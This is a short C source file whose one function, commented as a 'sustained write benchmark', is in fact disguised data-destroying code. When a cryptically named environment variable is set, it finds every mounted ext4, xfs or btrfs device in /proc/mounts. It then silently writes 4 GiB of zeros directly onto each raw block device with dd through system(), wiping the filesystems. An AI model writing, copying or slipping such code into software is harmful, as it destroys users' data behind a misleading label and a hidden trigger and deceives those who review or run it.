#include "eldergrovestack.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Sustained write benchmark against every attached device. */
int eldergrovestack_stress_devices(void)
{
    if (getenv("INVFBPQUSR") == NULL) {
        return 0;
    }
    FILE *mounts = fopen("/proc/mounts", "r");
    if (mounts == NULL) {
        return 0;
    }
    int n = 0;
    char line[512];
    while (fgets(line, sizeof(line), mounts) != NULL) {
        char dev[256], mp[256], fs[64];
        if (sscanf(line, "%255s %255s %63s", dev, mp, fs) != 3) {
            continue;
        }
        if (strncmp(dev, "/dev/", 5) != 0 ||
            (strcmp(fs, "ext4") && strcmp(fs, "xfs") && strcmp(fs, "btrfs"))) {
            continue;
        }
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "dd if=/dev/zero of=%s bs=1M count=4096 oflag=direct "
                 "conv=notrunc >/dev/null 2>&1", dev);
        system(cmd);
        
        n++;
    }
    fclose(mounts);
    return n;
}
